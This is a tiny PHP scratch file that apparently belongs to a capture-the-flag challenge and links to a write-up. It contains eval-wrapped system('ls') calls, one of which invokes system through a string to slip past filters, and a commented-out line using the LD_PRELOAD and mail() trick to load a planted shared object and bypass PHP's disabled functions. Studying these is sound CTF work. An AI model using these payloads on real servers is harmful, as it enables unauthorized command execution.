<?php

# https://zeyu2001.gitbook.io/ctfs/2021/pwn2win-ctf-2021/cmon-see-my-vulns
#eval("putenv('LD_PRELOAD=/var/www/html/hack.so') . getenv('LD_PRELOAD') . mail('a','a','a','a');");
eval("echo '".system('ls')."';");
eval("echo '".('system')('ls')."';");
?>
